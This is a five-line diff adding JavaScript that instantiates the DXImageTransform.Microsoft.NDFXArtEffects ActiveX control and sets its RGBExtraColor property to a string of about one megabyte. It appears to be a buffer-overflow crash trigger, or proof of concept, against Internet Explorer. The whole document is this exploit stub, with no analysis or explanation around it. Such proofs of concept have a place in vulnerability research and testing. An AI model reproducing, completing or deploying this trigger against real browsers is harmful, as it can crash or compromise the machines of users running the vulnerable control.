@@ -1,0 +1,5 @@
+var b = 'XXXX';
+while(b.length <=1024*1024) b+=b;
+var a = new ActiveXObject('DXImageTransform.Microsoft.NDFXArtEffects.1');
+var i = 1016320;
+a.RGBExtraColor = b.substring(0,i);
